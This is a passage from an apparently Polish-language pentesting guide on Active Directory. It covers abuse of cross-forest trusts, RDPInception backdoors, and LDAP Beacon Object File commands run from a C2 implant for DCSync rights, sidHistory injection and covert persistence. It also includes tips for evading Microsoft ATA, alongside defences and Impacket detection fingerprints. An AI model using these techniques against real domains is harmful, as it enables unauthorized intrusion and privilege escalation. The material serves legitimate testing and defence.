TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

W tym scenariuszu **Twoja domena jest zaufana** przez domenę zewnętrzną, co daje Ci **nieokreślone uprawnienia** w tej domenie. Musisz ustalić, **które podmioty zabezpieczeń z Twojej domeny mają jaki dostęp do domeny zewnętrznej**, a następnie spróbować to wykorzystać:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Zewnętrzna domena lasu — jednokierunkowa (wychodząca)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

W tym scenariuszu **Twoja domena** **ufa** domenie, której przyznaje pewne **uprawnienia**.

Jednak gdy **domena jest zaufana** przez domenę ufającą, domena zaufana **tworzy użytkownika** o **przewidywalnej nazwie**, którego **hasłem jest hasło zaufania**. Oznacza to, że można **uzyskać dostęp do użytkownika z domeny ufającej, aby dostać się do domeny zaufanej**, wyliczyć jej zasoby i spróbować uzyskać więcej uprawnień:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Innym sposobem na przejęcie domeny zaufanej jest znalezienie [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) utworzonego w **przeciwnym kierunku** niż zaufanie między domenami (co nie jest zbyt częste).

Innym sposobem na przejęcie domeny zaufanej jest zaczekanie na komputerze, do którego **użytkownik z domeny zaufanej może się zalogować** przez **RDP**. Następnie atakujący może wstrzyknąć kod do procesu sesji RDP i **uzyskać z niego dostęp do domeny źródłowej ofiary**.\
Ponadto, jeśli **ofiara podłączyła swój dysk twardy**, atakujący może za pośrednictwem procesu **sesji RDP** zapisać **backdoory** w **folderze Autostart na dysku twardym**. Ta technika nazywa się **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ograniczanie ryzyka związanego z nadużywaniem zaufania między domenami

### **Filtrowanie SID:**

- Ryzyko ataków wykorzystujących atrybut SID history przez zaufania między lasami jest ograniczane przez filtrowanie SID, które jest domyślnie włączone dla wszystkich zaufania między lasami. Opiera się to na założeniu, że zaufania wewnątrz lasu są bezpieczne, ponieważ zgodnie ze stanowiskiem Microsoft granicą bezpieczeństwa jest las, a nie domena.
- Jest jednak pewien haczyk: filtrowanie SID może zakłócać działanie aplikacji i dostęp użytkowników, dlatego czasami jest wyłączane.

### **Uwierzytelnianie selektywne:**

- W przypadku zaufania między lasami użycie uwierzytelniania selektywnego gwarantuje, że użytkownicy z obu lasów nie są uwierzytelniani automatycznie. Zamiast tego użytkownicy muszą otrzymać jawne uprawnienia, aby uzyskać dostęp do domen i serwerów w domenie lub lesie ufającym.
- Należy pamiętać, że te środki nie chronią przed wykorzystaniem zapisywalnego Configuration Naming Context (NC) ani przed atakami na konto zaufania.

[**Więcej informacji o zaufaniach między domenami w ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Nadużywanie AD oparte na LDAP z implantów działających na hoście

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ponownie implementuje podstawowe operacje LDAP w stylu bloodyAD jako x64 Beacon Object Files, które działają w całości wewnątrz implantu na hoście (np. Adaptix C2). Operatorzy kompilują pakiet poleceniem `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, wczytują `ldap.axs`, a następnie wywołują `ldap <subcommand>` z poziomu beacona. Cały ruch wykorzystuje bieżący kontekst zabezpieczeń logowania przez LDAP (389) z podpisywaniem/szyfrowaniem lub LDAPS (636) z automatycznym zaufaniem do certyfikatu, więc nie są potrzebne proxy SOCKS ani artefakty na dysku.<sup>[[4]](#references)</sup>

### Wyliczanie zasobów LDAP po stronie implantu

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` i `get-groupmembers` zamieniają krótkie nazwy/ścieżki OU na pełne DN i zrzucają odpowiadające im obiekty.
- `get-object`, `get-attribute` i `get-domaininfo` pobierają dowolne atrybuty (w tym deskryptory zabezpieczeń), a także metadane lasu/domeny z `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` i `get-rbcd` udostępniają bezpośrednio z LDAP kandydatów do roastingu, ustawienia delegowania oraz istniejące deskryptory [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` i `get-writable --detailed` analizują DACL, aby wyświetlić podmioty zaufania, uprawnienia (GenericAll/WriteDACL/WriteOwner/zapis atrybutów) oraz dziedziczenie, wskazując bezpośrednie cele eskalacji uprawnień przez ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Prymitywy zapisu LDAP do eskalacji uprawnień i utrzymywania dostępu

- BOF-y do tworzenia obiektów (`add-user`, `add-computer`, `add-group`, `add-ou`) pozwalają operatorowi przygotować nowe podmioty lub konta komputerów w dowolnym miejscu, gdzie istnieją uprawnienia do OU. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` umożliwiają bezpośrednie przejęcie kontroli nad celami, gdy zostaną znalezione uprawnienia do zapisu właściwości.
- Polecenia związane z ACL, takie jak `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, pozwalają wykorzystać WriteDACL/WriteOwner do dowolnego obiektu AD, by zresetować hasła, kontrolować członkostwo w grupach lub uzyskać uprawnienia replikacji DCSync — bez pozostawiania śladów PowerShell/ADSI. Odpowiedniki `remove-*` usuwają wstrzyknięte ACE.

### Delegowanie, roasting i nadużycia Kerberos

- `add-spn`/`set-spn` natychmiast umożliwiają przeprowadzenie Kerberoast na przejętym użytkowniku; `add-asreproastable` (zmiana UAC) oznacza konto jako podatne na AS-REP roasting bez zmiany hasła.
- Makra delegowania (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) modyfikują `msDS-AllowedToDelegateTo`, flagi UAC lub `msDS-AllowedToActOnBehalfOfOtherIdentity` bezpośrednio z beacon, umożliwiając ścieżki ataku z delegowaniem ograniczonym/nieograniczonym/RBCD i eliminując potrzebę korzystania ze zdalnego PowerShell lub RSAT.

### Wstrzykiwanie sidHistory, przenoszenie OU i kształtowanie powierzchni ataku

- `add-sidhistory` wstrzykuje uprzywilejowane SID-y do historii SID kontrolowanego podmiotu (zob. [Wstrzykiwanie SID-History](sid-history-injection.md)), zapewniając dyskretne dziedziczenie dostępu w całości przez LDAP/LDAPS.
- `move-object` zmienia DN/OU komputerów lub użytkowników, umożliwiając atakującemu przeniesienie zasobów w zakres delegowanych uprawnień przed użyciem `set-password`, `add-groupmember` lub `add-spn`. Zob. [Przenoszenie OU i dziedziczone uprawnienia](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions), aby poznać uprawnienia do przenoszenia i sprawdzania dziedziczenia.
- Precyzyjnie ukierunkowane polecenia usuwania (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itp.) umożliwiają szybkie wycofanie zmian po zebraniu poświadczeń lub ustanowieniu trwałego dostępu przez operatora, minimalizując ilość telemetrii.

## AD -> Azure i Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Kilka ogólnych metod obrony

[**Dowiedz się więcej o ochronie poświadczeń tutaj.**](../stealing-credentials/credentials-protections.md)

### **Środki ochrony poświadczeń**

- **Ograniczenia dla Domain Admins**: Zaleca się, aby konta Domain Admins mogły logować się wyłącznie do kontrolerów domeny, a nie do innych hostów.
- **Uprawnienia kont usług**: Usługi nie powinny działać z uprawnieniami Domain Admin (DA), aby zachować bezpieczeństwo.
- **Czasowe ograniczanie uprawnień**: Czas wykonywania zadań wymagających uprawnień DA powinien być ograniczony. Można to osiągnąć za pomocą: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Ograniczanie LDAP relay**: Przeprowadź audyt zdarzeń o identyfikatorach 2889/3074/3075, a następnie wymuś podpisywanie LDAP oraz LDAP channel binding przez LDAPS na kontrolerach domeny i klientach, aby blokować próby ataków LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Odciski protokołów aktywności Impacket

Jeśli chcesz wykrywać typowe techniki stosowane w AD, **nie polegaj wyłącznie na artefaktach kontrolowanych przez operatora**, takich jak zmienione nazwy plików binarnych, nazwy usług, tymczasowe pliki wsadowe czy ścieżki wyjściowe. Ustal wzorce ruchu, jaki generują prawidłowe klienty Windows podczas korzystania z [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC i WMI, a następnie szukaj **osobliwości implementacyjnych**, które pozostają nawet po edycji przez operatora plików `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` lub `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Kandydaci o wysokim poziomie pewności, wykrywalni samodzielnie** (po zweryfikowaniu względem własnego wzorca):
  - Uwierzytelnione DCE/RPC używające `auth_context_id = 79231 + ctx_id`
  - Wypełnienie dopełniające uwierzytelnianie DCE/RPC bajtami `0xff`
  - Powiązania Kerberos LDAP umieszczające surowe `AP-REQ` Kerberos bezpośrednio w `mechToken` SPNEGO
  - Żądania negotiate SMB2/3 z wartościami `ClientGuid` wyglądającymi jak ASCII
  - WMI `IWbemLevel1Login::NTLMLogin` używające niestandardowej przestrzeni nazw `//./root/cimv2`
  - Zakodowane na stałe wartości nonce Kerberos
- **Lepsze jako cechy korelacji/oceny**:
  - Rzadkie lub zduplikowane listy typów szyfrowania Kerberos, nietypowe/brakujące `PA-DATA` albo kolejność typów szyfrowania w TGS-REQ różniąca się od natywnej dla Windows
  - Komunikaty NTLM Type 1 bez informacji o wersji lub komunikaty Type 3 z pustymi nazwami hostów
  - Surowe NTLMSSP przenoszone w DCE/RPC zamiast SPNEGO, brakujące stopki weryfikacyjne DCE/RPC lub niezgodność identyfikatorów OID SPNEGO/Kerberos
  - Kilka takich cech pochodzących z tego samego hosta/użytkownika/sesji/przedziału czasu daje znacznie mocniejszy sygnał niż pojedyncze słabe pole
- **Używaj jako wzbogacenia, a nie samodzielnych alertów**:
  - Domyślne nazwy plików, ścieżki wyjściowe, losowe nazwy usług, tymczasowe nazwy plików wsadowych, domyślne nazwy kont komputerów oraz charakterystyczne dla narzędzi ciągi HTTP/WebDAV/RDP/MSSQL
  - Operatorzy mogą je łatwo zmienić; najlepiej wykorzystać je do wyjaśnienia, dlaczego korelacja między protokołami jest podejrzana
- **Uwagi operacyjne**:
  - Niektóre z tych sygnałów wymagają odszyfrowanego ruchu, analizy [PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW lub wglądu po stronie usługi
  - Przed zamianą sygnałów w alerty zweryfikuj je względem klientów Samba/Linux, urządzeń i starszego oprogramowania
  - W miarę zwiększania pewności co do wzorca przenoś wykrycia z etapu wzbogacania do threat huntingu, a następnie do alertowania

### **Wdrażanie technik dezinformacji**

- Wdrażanie dezinformacji polega na zastawianiu pułapek, takich jak fałszywi użytkownicy lub komputery, z cechami takimi jak hasła, które nigdy nie wygasają, lub oznaczenie jako Trusted for Delegation. Szczegółowe podejście obejmuje tworzenie użytkowników z określonymi uprawnieniami lub dodawanie ich do grup o wysokich uprawnieniach.<sup>[[2]](#references)</sup>
- Praktyczny przykład wykorzystania narzędzi: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Więcej informacji o wdrażaniu technik dezinformacji można znaleźć na stronie [Deploy-Deception w GitHub](https://github.com/samratashok/Deploy-Deception).

### **Wykrywanie dezinformacji**

- **Obiekty użytkowników**: Podejrzane oznaki obejmują nietypowy ObjectSID, rzadkie logowania, daty utworzenia i niewielką liczbę błędnych haseł.
- **Ogólne oznaki**: Porównanie atrybutów potencjalnych obiektów-pułapek z atrybutami prawdziwych obiektów może ujawnić niespójności. Narzędzia takie jak [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogą pomóc w wykrywaniu takich pułapek.

### **Omijanie systemów wykrywania**

- **Omijanie wykrywania przez Microsoft ATA**:
  - **Wyliczanie użytkowników**: Unikanie wyliczania sesji na kontrolerach domeny, aby zapobiec wykryciu przez ATA.
  - **Podszywanie się przy użyciu biletów**: Użycie kluczy **aes** do tworzenia biletów pomaga uniknąć wykrycia, ponieważ nie następuje degradacja do NTLM.
  - **Ataki DCSync**: Zaleca się wykonywanie ich z komputera, który nie jest kontrolerem domeny, aby uniknąć wykrycia przez ATA; bezpośrednie wykonanie z kontrolera domeny wywoła alerty.

## References

- [1] [Przewodnik po atakowaniu relacji zaufania domen](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Fałszowanie relacji zaufania w celu dezinformacji w Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Od Domain Admin do Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Zbiór LDAP BOF – działający w pamięci zestaw narzędzi LDAP do eksploatacji Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Wykorzystanie hashy NTLM jako listy słów](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (laboratorium NetExec AD) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – analiza Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon – Onelogon: przejmowanie kont Active Directory za pośrednictwem Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft – Jak zarządzać zmianami w połączeniach bezpiecznego kanału Netlogon związanymi z CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Podróż przez zapomniane interfejsy Null Session i MS-RPC](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Filtrowanie SID jako granica bezpieczeństwa między domenami? (część 4) – badanie omijania filtrowania SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Filtrowanie SID jako granica bezpieczeństwa między domenami? (część 5) – atak zaufania Golden GMSA, z domeny podrzędnej do nadrzędnej](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Filtrowanie SID jako granica bezpieczeństwa między domenami? (część 6) – atak zaufania przez zmianę schematu, z domeny podrzędnej do nadrzędnej](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Od DA do EA z ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Eskalacja z administratorów domeny podrzędnej do administratorów przedsiębiorstwa w 5 minut przez nadużycie AD CS – dalszy ciąg](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE w rękawie: projektowanie backdoorów DACL w Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Kod źródłowy modułu pre2k NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema – atrybut msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf – HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
